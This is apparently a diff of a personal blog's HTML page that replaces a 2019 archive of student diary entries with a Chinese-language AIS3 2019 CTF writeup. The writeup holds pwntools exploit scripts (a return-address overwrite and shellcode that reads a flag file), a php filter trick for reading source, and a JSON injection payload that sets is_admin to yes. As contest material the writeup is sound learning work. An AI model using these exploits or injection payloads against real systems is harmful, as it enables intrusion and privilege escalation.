@@ -6,21 +6,26 @@
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="Halloworld-website">
-    <title>所有文章: 2019 - Halloworld-website</title>
+    <title>2019_ais3_ctf_writeup - Halloworld-website</title>
     <meta name="author" content="halloworld">
     
     
         <link rel="icon" href="http://halloworld.tw/assets/images/profile.jpg">
     
     
-    <script type="application/ld+json">{}</script>
-    <meta property="og:type" content="blog">
-<meta property="og:title" content="Halloworld-website">
-<meta property="og:url" content="http://halloworld.tw/archives/2019/index.html">
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"halloworld","sameAs":["https://github.com/william31212","https://www.facebook.com/pinhan.huang.5","https://www.linkedin.com/in/%E5%93%81%E7%BF%B0-%E9%BB%83-9b80a2180/","https://www.instagram.com/pinhan0601/?hl=zh-tw"],"image":"profile.jpg"},"articleBody":"PwnWelcome BOF\n用objdump 或 ida 知道 [rbp-30h] ，必須壓過48 + 8 個byte，才能到return_address，但奇怪的是蓋48才過??\n\n然後要跳的這0000000000400687 &lt;welcome_to_ais3_2019&gt;\n\n利用pwntools\n\n\n12345678910111213141516from pwn import *context(arch = 'i386', os = 'linux')host = 'pre-exam-pwn.ais3.org'port = 10001r = remote(host, port)p = 0x0000000000400687payload = p64(p)r.recvline()r.sendline('A'*48 + payload)r.interactive()\nORW\nx86-64的結構\n裡用shellcraft產的shell-code，注入輸入點\n一樣查看buffer-overflow的點，跳到.data的address0x00000000006010A0，利用ida查看\n\n123456789101112131415161718192021222324252627282930313233343536from pwn import *context(arch = 'amd64', os = 'linux')host = 'pre-exam-pwn.ais3.org'port = 10001r = remote(host, port)# debug'''context.log_level = 'debug'context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']if args.G:    gdb.attach(p)'''shellcode = ''shellcode += shellcraft.pushstr('/home/orw/flag')shellcode += shellcraft.open('rsp', 0, 0)shellcode += shellcraft.read('rax', 'rsp', 100)shellcode += shellcraft.write(1, 'rsp', 100)'''log.info(shellcode)'''log.info(shellcode)r.recvline()r.sendline(asm(shellcode))r.recvline()p = 0x00000000006010A0r.sendline('A'*40 + p64(p))r.interactive()\nreverseTrivial\n用ida組出flag\n\nwebSimpleWindow\n須利用離線版查看，可利用chorme工具改成offline顯示\n\nHidden\n在console中跑jscode，運行r()的function\n\nd1v1n6\nphpfilter，把index.php打包起來\ndecode之後發現不能用127.0.0.1，0.0.0.0\nfilter 包起 http://localhost\ndecode出來就是結果\n\nCryptoTCash\n將上面的ascii字元用md5 &amp; sha256照做一次，會有一張表\n將兩個的結果做比對，取交集就是flag\n\n123456789101112131415161718192021from hashlib import md5,sha256cand = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPWRSTUVWXYZ1234567890@,- _&#123;&#125;'md5dic = &#123;&#125;sha256dic = &#123;&#125;'''f = open('news.txt','w')f2 = open('news2.txt','w')'''md5s = [41, 63, 46, 51, 6, 26, 42, 50, 44, 33, 29, 50, 27, 28, 30, 17, 31, 19, 46, 50, 33, 45, 26, 26, 29, 31, 52, 33, 1, 45, 31, 22, 50, 50, 50, 50, 50, 31, 22, 50, 44, 26, 44, 49, 50, 49, 26, 45, 31, 30, 22, 44, 30, 31, 17, 50, 50, 50, 31, 43, 52, 50, 53, 31, 30, 17, 26, 31, 46, 41, 44, 26, 31, 52, 50, 30, 31, 26, 39, 31, 46, 33, 27, 1, 42, 50, 31, 30, 12, 26, 27, 52, 31, 30, 12, 31, 46, 26, 27, 14, 50, 31, 22, 52, 33, 31, 41, 50, 46, 31, 22, 23, 41, 31, 53, 26, 21, 31, 33, 30, 31, 19, 39, 51, 33, 30, 39, 51, 12, 58, 60, 31, 41, 33, 53, 31, 3, 17, 50, 31, 51, 26, 29, 52, 31, 33, 22, 26, 31, 41, 51, 54, 41, 29, 52, 31, 19, 23, 33, 30, 44, 26, 27, 38, 8, 50, 29, 15]sha256s = [61, 44, 3, 14, 22, 41, 43, 30, 49, 59, 58, 30, 11, 3, 24, 35, 40, 46, 3, 42, 59, 36, 41, 41, 41, 40, 9, 59, 23, 36, 40, 33, 42, 42, 42, 42, 42, 40, 44, 42, 49, 24, 49, 28, 42, 33, 24, 36, 40, 24, 33, 10, 24, 40, 35, 42, 42, 42, 40, 39, 9, 42, 3, 40, 24, 35, 24, 40, 3, 61, 49, 24, 40, 9, 42, 24, 40, 41, 17, 40, 12, 57, 11, 23, 43, 42, 40, 24, 18, 41, 11, 9, 40, 24, 18, 40, 3, 41, 11, 12, 42, 40, 44, 9, 59, 40, 61, 42, 3, 40, 44, 13, 61, 40, 3, 24, 29, 40, 59, 24, 40, 19, 18, 6, 59, 24, 18, 6, 22, 0, 39, 40, 61, 57, 3, 40, 17, 35, 42, 40, 58, 24, 58, 9, 40, 59, 44, 24, 40, 61, 48, 52, 61, 58, 9, 40, 19, 13, 59, 24, 53, 41, 11, 55, 55, 42, 58, 18]for i in cand:\tmd5dic.setdefault(int(md5(i.encode()).hexdigest(),16) % 64, []).append(i)\tsha256dic.setdefault(int(sha256(i.encode()).hexdigest(),16) % 64, []).append(i)for i, j in zip(md5s, sha256s):\tfor ii in md5dic[i]:\t\tif ii in sha256dic[j]:\t\t\tprint(str(ii), end='')\t# print(md5dic[i], sha256dic[j], end='\\n\\n')\nMiscWelcome\n簽到題\n\nKcufsJ\n將code reverse 然後 run\n\nAre you admin?\ncommand injection\n讓name 對到 fucker\nis_admin 對到 yes\n接下來讓隨便的東西對到dictionary，才能將is_admin做忽略\n最後再補上一個對照，因為最後有個引號\n\n\n\n{\\&quot;name\\&quot;:\\&quot;#{name}\\&quot;,\\&quot;is_admin\\&quot;:\\&quot;no\\&quot;, \\&quot;age\\&quot;:\\&quot;#{age}\\&quot;}\n\nfucker&quot;,&quot;is_admin&quot;:&quot;yes&quot;,&quot;2&quot;:{&quot;a&quot;:&quot;b\n18&quot;},&quot;1&quot;:&quot;2\n\n","dateCreated":"2019-07-13T09:32:14+08:00","dateModified":"2019-07-13T09:33:36+08:00","datePublished":"2019-07-13T09:32:14+08:00","description":"","headline":"2019_ais3_ctf_writeup","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://halloworld.tw/post/2019-ais3-ctf-writeup/"},"publisher":{"@type":"Organization","name":"halloworld","sameAs":["https://github.com/william31212","https://www.facebook.com/pinhan.huang.5","https://www.linkedin.com/in/%E5%93%81%E7%BF%B0-%E9%BB%83-9b80a2180/","https://www.instagram.com/pinhan0601/?hl=zh-tw"],"image":"profile.jpg","logo":{"@type":"ImageObject","url":"profile.jpg"}},"url":"http://halloworld.tw/post/2019-ais3-ctf-writeup/","keywords":"ais3,ctf,writeup"}</script>
+    <meta name="description" content="PwnWelcome BOF 用objdump 或 ida 知道 [rbp-30h] ，必須壓過48 + 8 個byte，才能到return_address，但奇怪的是蓋48才過??  然後要跳的這0000000000400687 &amp;lt;welcome_to_ais3_2019&amp;gt;  利用pwntools   12345678910111213141516from pwn import *c">
+<meta name="keywords" content="ais3,ctf,writeup">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="2019_ais3_ctf_writeup">
+<meta property="og:url" content="http://halloworld.tw/post/2019-ais3-ctf-writeup/index.html">
 <meta property="og:site_name" content="Halloworld-website">
+<meta property="og:description" content="PwnWelcome BOF 用objdump 或 ida 知道 [rbp-30h] ，必須壓過48 + 8 個byte，才能到return_address，但奇怪的是蓋48才過??  然後要跳的這0000000000400687 &amp;lt;welcome_to_ais3_2019&amp;gt;  利用pwntools   12345678910111213141516from pwn import *c">
 <meta property="og:locale" content="zh-tw">
+<meta property="og:updated_time" content="2019-07-13T01:33:36.576Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Halloworld-website">
+<meta name="twitter:title" content="2019_ais3_ctf_writeup">
+<meta name="twitter:description" content="PwnWelcome BOF 用objdump 或 ida 知道 [rbp-30h] ，必須壓過48 + 8 個byte，才能到return_address，但奇怪的是蓋48才過??  然後要跳的這0000000000400687 &amp;lt;welcome_to_ais3_2019&amp;gt;  利用pwntools   12345678910111213141516from pwn import *c">
     
     
         
@@ -59,7 +64,7 @@
         
     
 
-<header id="header" data-behavior="1">
+<header id="header" data-behavior="4">
     <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
     <div class="header-title">
         <a class="header-title-link" href="/ ">Halloworld-website</a>
@@ -82,7 +87,7 @@
         
     
 
-<nav id="sidebar" data-behavior="1">
+<nav id="sidebar" data-behavior="4">
     <div class="sidebar-container">
         
             <div class="sidebar-profile">
@@ -190,82 +195,22 @@
 </nav>
 
             
-            <div id="main" data-behavior="1"
+            <div id="main" data-behavior="4"
                  class="
                         hasCoverMetaIn
                         ">
                 
-    <section class="postShorten-group main-content-wrap">
+<article class="post">
     
     
-    <article class="postShorten postShorten--thumbnailimg-bottom">
-        <div class="postShorten-wrap">
-            
-            <div class="postShorten-header">
-                <h1 class="postShorten-title">
-                    
-                        <a class="link-unstyled" href="/post/Diary27/">
-                            Diary27
-                        </a>
-                    
-                </h1>
-                <div class="postShorten-meta">
-    <time datetime="2019-07-13T09:34:36+08:00">
-	
-		    7月 13, 2019
-    	
-    </time>
+        <div class="post-header main-content-wrap text-left">
     
-</div>
-
-            </div>
-            
-                <div class="postShorten-content">
-                    <h2 id="復活聲明"><a href="#復活聲明" class="headerlink" title="復活聲明"></a>復活聲明</h2><ul>
-<li>很明顯天天寫日記的計畫已失敗，也大概三四個月沒更新了，課業繁忙到不想打日記了，終於要來更新了。</li>
-</ul>
-<h2 id="活動"><a href="#活動" class="headerlink" title="活動"></a>活動</h2><ul>
-<li>目前已完成NCPU，之後會補上近日心得。</li>
-<li>之前AIS3的writeup以補上</li>
-<li>歡迎來光顧我與同隊的同胞做的專案<ul>
-<li><a href="http://rish.com.tw/" target="_blank" rel="noopener">rish</a></li>
-</ul>
-</li>
-</ul>
-<h2 id="一些心得"><a href="#一些心得" class="headerlink" title="一些心得"></a>一些心得</h2><ul>
-<li>差不多放了兩個禮拜的暑假了，前陣子都在期末考周，幾乎天天都留在學校念書，再前一陣子也在忙專案的一些事情，這學期真的累到不行。放完暑假後，沒什麼力氣打code，也給自己放空了很久，然後才想到我的網站都毫無更新QQ。</li>
-</ul>
-
-                    
-                        
-
-                    
-                    
-                        <p>
-                            <a href="/post/Diary27/#post-footer" class="postShorten-excerpt_link link">
-                                留言與分享
-                            </a>
-                        </p>
-                    
-                </div>
-            
-        </div>
-        
-    </article>
+        <h1 class="post-title">
+            2019_ais3_ctf_writeup
+        </h1>
     
     
-    <article class="postShorten postShorten--thumbnailimg-bottom">
-        <div class="postShorten-wrap">
-            
-            <div class="postShorten-header">
-                <h1 class="postShorten-title">
-                    
-                        <a class="link-unstyled" href="/post/2019-ais3-ctf-writeup/">
-                            2019_ais3_ctf_writeup
-                        </a>
-                    
-                </h1>
-                <div class="postShorten-meta">
+        <div class="post-meta">
     <time datetime="2019-07-13T09:32:14+08:00">
 	
 		    7月 13, 2019
@@ -274,10 +219,13 @@
     
 </div>
 
-            </div>
-            
-                <div class="postShorten-content">
-                    <h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Welcome-BOF"><a href="#Welcome-BOF" class="headerlink" title="Welcome BOF"></a>Welcome BOF</h2><ul>
+    
+</div>
+
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Welcome-BOF"><a href="#Welcome-BOF" class="headerlink" title="Welcome BOF"></a>Welcome BOF</h2><ul>
 <li><p>用objdump 或 ida 知道 [rbp-30h] ，必須壓過48 + 8 個byte，才能到return_address，但奇怪的是蓋48才過??</p>
 </li>
 <li><p>然後要跳的這<code>0000000000400687 &lt;welcome_to_ais3_2019&gt;</code></p>
@@ -333,473 +281,86 @@
 <li><code>18&quot;},&quot;1&quot;:&quot;2</code></li>
 </ul>
 
-                    
-                        
+            
 
-                    
-                    
-                        <p>
-                            <a href="/post/2019-ais3-ctf-writeup/#post-footer" class="postShorten-excerpt_link link">
-                                留言與分享
-                            </a>
-                        </p>
-                    
-                </div>
-            
         </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
         
-    </article>
-    
-    
-    <article class="postShorten postShorten--thumbnailimg-bottom">
-        <div class="postShorten-wrap">
-            
-            <div class="postShorten-header">
-                <h1 class="postShorten-title">
-                    
-                        <a class="link-unstyled" href="/post/Diary26/">
-                            Diary26
-                        </a>
-                    
-                </h1>
-                <div class="postShorten-meta">
-    <time datetime="2019-04-22T23:29:29+08:00">
-	
-		    4月 22, 2019
-    	
-    </time>
-    
-</div>
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">標籤</span><br>
+                
+    <a class="tag tag--primary tag--small t-link" href="/tags/ais3-ctf-writeup/">ais3,ctf,writeup</a>
 
             </div>
-            
-                <div class="postShorten-content">
-                    <h2 id="今日課程"><a href="#今日課程" class="headerlink" title="今日課程"></a>今日課程</h2><ul>
-<li>微分方程</li>
-<li>web</li>
-</ul>
-<h2 id="今日體驗"><a href="#今日體驗" class="headerlink" title="今日體驗"></a>今日體驗</h2><ul>
-<li>上禮拜期中考周，就沒有天天更新了QQ。拿到了成績也警惕自己要天天算題目，一直忙於其他東西疏忽了練習，讓我這次考的沒有很好。web的PWA也是蠻茫的，又是陷入了低潮時期。不過考完試三天就把與惡看完真的頗爽的，雖然現在相當空虛。</li>
-</ul>
-<h2 id="今日做到的事情"><a href="#今日做到的事情" class="headerlink" title="今日做到的事情"></a>今日做到的事情</h2><ul>
-<li style="list-style: none"><input type="checkbox" checked> 微分方程</li>
-<li style="list-style: none"><input type="checkbox" checked> 心靈休息</li>
-</ul>
-
-                    
-                        
-
-                    
-                    
-                        <p>
-                            <a href="/post/Diary26/#post-footer" class="postShorten-excerpt_link link">
-                                留言與分享
-                            </a>
-                        </p>
-                    
-                </div>
-            
-        </div>
-        
-    </article>
-    
-    
-    <article class="postShorten postShorten--thumbnailimg-bottom">
-        <div class="postShorten-wrap">
-            
-            <div class="postShorten-header">
-                <h1 class="postShorten-title">
-                    
-                        <a class="link-unstyled" href="/post/Diary25/">
-                            Diary25
-                        </a>
-                    
-                </h1>
-                <div class="postShorten-meta">
-    <time datetime="2019-04-10T21:39:22+08:00">
-	
-		    4月 10, 2019
-    	
-    </time>
-    
-</div>
-
-            </div>
-            
-                <div class="postShorten-content">
-                    <h2 id="今日課程"><a href="#今日課程" class="headerlink" title="今日課程"></a>今日課程</h2><ul>
-<li>作業系統</li>
-<li>Pygame</li>
-</ul>
-<h2 id="今日體驗"><a href="#今日體驗" class="headerlink" title="今日體驗"></a>今日體驗</h2><ul>
-<li>我覺得作業系統跟泛型應該是我最難捉摸的，有很大部分都還蠻茫的。不過日子要過，笑得過也是一天，還是笑著過生活好。今天是Pygame展出的日子，工時長達一個月左右，雖然我的code寫得真的糞到笑，但我真的很努力在吸收了。展出也蠻順利的，雖然我打了30場以上自己的遊戲，打到手都痛了。晚上自辦賽只寫了一題，另外那題讀不太懂意思，然後找到的規律很像也有問題，是不是有危機了呢?</li>
-</ul>
-<h2 id="Pygame-Rifleman-分享"><a href="#Pygame-Rifleman-分享" class="headerlink" title="Pygame-Rifleman 分享"></a>Pygame-Rifleman 分享</h2><p><a href="https://github.com/william31212/Pygame" target="_blank" rel="noopener">https://github.com/william31212/Pygame</a></p>
-<h2 id="今日做到的事情"><a href="#今日做到的事情" class="headerlink" title="今日做到的事情"></a>今日做到的事情</h2><ul>
-<li style="list-style: none"><input type="checkbox" checked> 順利展出</li>
-<li style="list-style: none"><input type="checkbox" checked> 心靈休息</li>
-</ul>
-
-                    
-                        
-
-                    
-                    
-                        <p>
-                            <a href="/post/Diary25/#post-footer" class="postShorten-excerpt_link link">
-                                留言與分享
-                            </a>
-                        </p>
-                    
-                </div>
-            
-        </div>
-        
-    </article>
-    
-    
-    <article class="postShorten postShorten--thumbnailimg-bottom">
-        <div class="postShorten-wrap">
-            
-            <div class="postShorten-header">
-                <h1 class="postShorten-title">
-                    
-                        <a class="link-unstyled" href="/post/Diary24/">
-                            Diary24
-                        </a>
-                    
-                </h1>
-                <div class="postShorten-meta">
-    <time datetime="2019-04-09T22:07:25+08:00">
-	
-		    4月 09, 2019
-    	
-    </time>
-    
-</div>
-
-            </div>
-            
-                <div class="postShorten-content">
-                    <h2 id="今日課程"><a href="#今日課程" class="headerlink" title="今日課程"></a>今日課程</h2><ul>
-<li>泛型</li>
-<li>防身術</li>
-</ul>
-<h2 id="今日體驗"><a href="#今日體驗" class="headerlink" title="今日體驗"></a>今日體驗</h2><ul>
-<li>泛型是不是要GG惹，有一大堆東西都還沒有熟，有想退選的念頭。防身術也是下星期期中考，不過覺得蠻好玩的，比起其他科還有和藹可親許多。</li>
-</ul>
-<h2 id="今日做到的事情"><a href="#今日做到的事情" class="headerlink" title="今日做到的事情"></a>今日做到的事情</h2><ul>
-<li style="list-style: none"><input type="checkbox" checked> 演算法</li>
-<li style="list-style: none"><input type="checkbox" checked> 計組Booth’s algorithm</li>
-</ul>
-
-                    
-                        
-
-                    
-                    
-                        <p>
-                            <a href="/post/Diary24/#post-footer" class="postShorten-excerpt_link link">
-                                留言與分享
-                            </a>
-                        </p>
-                    
-                </div>
-            
-        </div>
-        
-    </article>
-    
-    
-    <article class="postShorten postShorten--thumbnailimg-bottom">
-        <div class="postShorten-wrap">
-            
-            <div class="postShorten-header">
-                <h1 class="postShorten-title">
-                    
-                        <a class="link-unstyled" href="/post/Diary23/">
-                            Diary23
-                        </a>
-                    
-                </h1>
-                <div class="postShorten-meta">
-    <time datetime="2019-04-08T23:20:57+08:00">
-	
-		    4月 08, 2019
-    	
-    </time>
-    
-</div>
-
-            </div>
-            
-                <div class="postShorten-content">
-                    <h3 id="九天都沒更新，有點混XD"><a href="#九天都沒更新，有點混XD" class="headerlink" title="九天都沒更新，有點混XD"></a>九天都沒更新，有點混XD</h3><h2 id="今日課程"><a href="#今日課程" class="headerlink" title="今日課程"></a>今日課程</h2><ul>
-<li>工數</li>
-<li>web</li>
-</ul>
-<h2 id="九天分享"><a href="#九天分享" class="headerlink" title="九天分享"></a>九天分享</h2><ul>
-<li>一次放就放了9天，結果時間也過得很快，中間也沒念到甚麼書，然後投資蠻多時間在Pygame上面，還記得第一天去比賽，然後就幾乎都在家，清明連假有去掃墓這樣。</li>
-</ul>
-<h2 id="今日體驗"><a href="#今日體驗" class="headerlink" title="今日體驗"></a>今日體驗</h2><ul>
-<li>放了九天的腦袋真的不是普通的爛，腦袋有點混沌，然後老師今天都沒出錯，所以加零分。下午web有小考，考的都跟考古一樣，很像有講到JQuery的東西ㄅ，不過沒什麼專心聽。覺得現在在還債，都沒唸書的下場QQQ</li>
-</ul>
-<h2 id="今日做到的事情"><a href="#今日做到的事情" class="headerlink" title="今日做到的事情"></a>今日做到的事情</h2><ul>
-<li style="list-style: none"><input type="checkbox" checked> 念演算法</li>
-</ul>
-
-                    
-                        
-
-                    
-                    
-                        <p>
-                            <a href="/post/Diary23/#post-footer" class="postShorten-excerpt_link link">
-                                留言與分享
-                            </a>
-                        </p>
-                    
-                </div>
-            
-        </div>
-        
-    </article>
-    
-    
-    <article class="postShorten postShorten--thumbnailimg-bottom">
-        <div class="postShorten-wrap">
-            
-            <div class="postShorten-header">
-                <h1 class="postShorten-title">
-                    
-                        <a class="link-unstyled" href="/post/Diary22/">
-                            Diary22
-                        </a>
-                    
-                </h1>
-                <div class="postShorten-meta">
-    <time datetime="2019-03-29T18:08:12+08:00">
-	
-		    3月 29, 2019
-    	
-    </time>
-    
-</div>
-
-            </div>
-            
-                <div class="postShorten-content">
-                    <h2 id="今日課程"><a href="#今日課程" class="headerlink" title="今日課程"></a>今日課程</h2><ul>
-<li>演算法</li>
-<li>英文</li>
-</ul>
-<h2 id="今日體驗"><a href="#今日體驗" class="headerlink" title="今日體驗"></a>今日體驗</h2><ul>
-<li>明天開始是大學生的九天連假，不過我猜只能在家打code，pygame的專案下禮拜要展出，然後星期五的演算法也要考，覺得快喘不過氣了，希望能撐得住，明天也有比賽要打，希望能過順利。接下來九天應該不定期更新</li>
-</ul>
-<h2 id="今日做到的事情"><a href="#今日做到的事情" class="headerlink" title="今日做到的事情"></a>今日做到的事情</h2><ul>
-<li style="list-style: none"><input type="checkbox" checked> 念演算法</li>
-</ul>
-
-                    
-                        
-
-                    
-                    
-                        <p>
-                            <a href="/post/Diary22/#post-footer" class="postShorten-excerpt_link link">
-                                留言與分享
-                            </a>
-                        </p>
-                    
-                </div>
-            
-        </div>
-        
-    </article>
-    
-    
-    <article class="postShorten postShorten--thumbnailimg-bottom">
-        <div class="postShorten-wrap">
-            
-            <div class="postShorten-header">
-                <h1 class="postShorten-title">
-                    
-                        <a class="link-unstyled" href="/post/Diary21/">
-                            Diary21
-                        </a>
-                    
-                </h1>
-                <div class="postShorten-meta">
-    <time datetime="2019-03-29T02:00:36+08:00">
-	
-		    3月 29, 2019
-    	
-    </time>
-    
-</div>
-
-            </div>
-            
-                <div class="postShorten-content">
-                    <h2 id="今日課程"><a href="#今日課程" class="headerlink" title="今日課程"></a>今日課程</h2><ul>
-<li>科技管理</li>
-<li>計算機組織</li>
-<li>NISRA</li>
-</ul>
-<h2 id="今日體驗"><a href="#今日體驗" class="headerlink" title="今日體驗"></a>今日體驗</h2><ul>
-<li>凌晨兩點還是寫了日記，早上通識做pygame，下午計算機組織joseph考的水水的，不知道會不會烙賽，晚上NISRA是chess上php，不過我得忙著做web作業，結果我的作業都是howhow耶</li>
-</ul>
-<h2 id="我的作業分享"><a href="#我的作業分享" class="headerlink" title="我的作業分享"></a>我的作業分享</h2><ul>
-<li><a href="/lab04">贓連結</a></li>
-</ul>
-<h2 id="今日做到的事情"><a href="#今日做到的事情" class="headerlink" title="今日做到的事情"></a>今日做到的事情</h2><ul>
-<li style="list-style: none"><input type="checkbox" checked> web作業</li>
-</ul>
-
-                    
-                        
-
-                    
-                    
-                        <p>
-                            <a href="/post/Diary21/#post-footer" class="postShorten-excerpt_link link">
-                                留言與分享
-                            </a>
-                        </p>
-                    
-                </div>
-            
-        </div>
-        
-    </article>
-    
-    
-    <article class="postShorten postShorten--thumbnailimg-bottom">
-        <div class="postShorten-wrap">
-            
-            <div class="postShorten-header">
-                <h1 class="postShorten-title">
-                    
-                        <a class="link-unstyled" href="/post/Diary20/">
-                            Diary20
-                        </a>
-                    
-                </h1>
-                <div class="postShorten-meta">
-    <time datetime="2019-03-27T22:47:20+08:00">
-	
-		    3月 27, 2019
-    	
-    </time>
-    
-</div>
-
-            </div>
-            
-                <div class="postShorten-content">
-                    <h2 id="今日課程"><a href="#今日課程" class="headerlink" title="今日課程"></a>今日課程</h2><ul>
-<li>只有視訊處理</li>
-</ul>
-<h2 id="今日體驗"><a href="#今日體驗" class="headerlink" title="今日體驗"></a>今日體驗</h2><ul>
-<li>今天睡到飽，起來就是打pygame，去圖書館打pygame，到學校後小念計組，念完覺得要去祭祖，單壓乘一，加一個諧音梗，怎麼那麼優質，然後還是打Pygame，晚上在做封面耶</li>
-</ul>
-<h2 id="封面分享"><a href="#封面分享" class="headerlink" title="封面分享"></a>封面分享</h2><p><blockquote class="imgur-embed-pub" lang="en" data-id="a/YNRTGBZ"><a href="//imgur.com/YNRTGBZ"></a></blockquote><script async src="//s.imgur.com/min/embed.js" charset="utf-8"></script></p>
-<h2 id="今日做到的事情"><a href="#今日做到的事情" class="headerlink" title="今日做到的事情"></a>今日做到的事情</h2><ul>
-<li style="list-style: none"><input type="checkbox" checked> Pygame and Pygame and Pygame</li>
-<li style="list-style: none"><input type="checkbox"> 計組甚麼就算了</li>
-</ul>
-
-                    
-                        
-
-                    
-                    
-                        <p>
-                            <a href="/post/Diary20/#post-footer" class="postShorten-excerpt_link link">
-                                留言與分享
-                            </a>
-                        </p>
-                    
-                </div>
-            
-        </div>
-        
-    </article>
-    
-    
-    <article class="postShorten postShorten--thumbnailimg-bottom">
-        <div class="postShorten-wrap">
-            
-            <div class="postShorten-header">
-                <h1 class="postShorten-title">
-                    
-                        <a class="link-unstyled" href="/post/Diary19/">
-                            Diary19
-                        </a>
-                    
-                </h1>
-                <div class="postShorten-meta">
-    <time datetime="2019-03-26T23:34:26+08:00">
-	
-		    3月 26, 2019
-    	
-    </time>
-    
-</div>
-
-            </div>
-            
-                <div class="postShorten-content">
-                    <h2 id="今日課程"><a href="#今日課程" class="headerlink" title="今日課程"></a>今日課程</h2><ul>
-<li>泛型</li>
-<li>防身術</li>
-<li>CPE</li>
-</ul>
-<h2 id="在此致歉"><a href="#在此致歉" class="headerlink" title="在此致歉"></a>在此致歉</h2><ul>
-<li>這次比賽又遇到最小生成樹了，我又忘記怎麼寫了，在此向大眾懺悔</li>
-</ul>
-<h2 id="今日體驗"><a href="#今日體驗" class="headerlink" title="今日體驗"></a>今日體驗</h2><ul>
-<li>明天早上放假耶，不過還是要做pygame。早上試著把泛型作業弄一弄，剩下一個小部分還沒弄完，然後似乎老師要考筆試，我覺得要完蛋了。今天防身術真的累到不行，老師一直不斷地要我們踢腳，打拳，覺得有一種眼冒金星的感覺，不過運動完真的比較舒服一點，又讓我想起以前每天下課打排球的感覺，打到天黑才回家。CPE這次題目比較簡單一點，不過沒有把spanning tree刻出來真的該被打哀，老師都講過好幾次了，覺得可惜。</li>
-</ul>
-<h2 id="感謝某位人士提供當年打球照片"><a href="#感謝某位人士提供當年打球照片" class="headerlink" title="感謝某位人士提供當年打球照片"></a>感謝某位人士提供當年打球照片</h2><p><img src="https://i.imgur.com/7pSOceu.jpg" height="300" width="200"></p>
-<h2 id="今日做到的事情"><a href="#今日做到的事情" class="headerlink" title="今日做到的事情"></a>今日做到的事情</h2><ul>
-<li style="list-style: none"><input type="checkbox" checked> 寫泛型作業</li>
-<li style="list-style: none"><input type="checkbox" checked> pygame</li>
-</ul>
-
-                    
-                        
-
-                    
-                    
-                        <p>
-                            <a href="/post/Diary19/#post-footer" class="postShorten-excerpt_link link">
-                                留言與分享
-                            </a>
-                        </p>
-                    
-                </div>
-            
-        </div>
-        
-    </article>
-    
-    <div class="pagination-bar">
-    <ul class="pagination">
         
         
-          <li class="pagination-next">
-            <a class="btn btn--default btn--small" href="/archives/2019/page/2/">
-              <span>下一頁</span>
-              <i class="fa fa-angle-right text-base icon-ml"></i>
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/post/Diary27/" data-tooltip="Diary27" aria-label="上一篇: Diary27">
+                
+                    <i class="fa fa-angle-left" aria-hidden="true"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/post/Diary26/" data-tooltip="Diary26" aria-label="下一篇: Diary26">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                    <i class="fa fa-angle-right" aria-hidden="true"></i>
+                </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Diesen Beitrag teilen">
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
-          </li>
+        </li>
         
-        <li class="pagination-number">第 1 頁 共 3 頁</li>
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://halloworld.tw/post/2019-ais3-ctf-writeup/" title="分享到 Facebook">
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=http://halloworld.tw/post/2019-ais3-ctf-writeup/" title="分享到 Google+">
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
     </ul>
 </div>
 
-</section>
+
+        
+        
+            
+        
+    </div>
+</article>
 
 
 
@@ -810,6 +371,94 @@
 </footer>
 
             </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/post/Diary27/" data-tooltip="Diary27" aria-label="上一篇: Diary27">
+                
+                    <i class="fa fa-angle-left" aria-hidden="true"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/post/Diary26/" data-tooltip="Diary26" aria-label="下一篇: Diary26">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                    <i class="fa fa-angle-right" aria-hidden="true"></i>
+                </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Diesen Beitrag teilen">
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
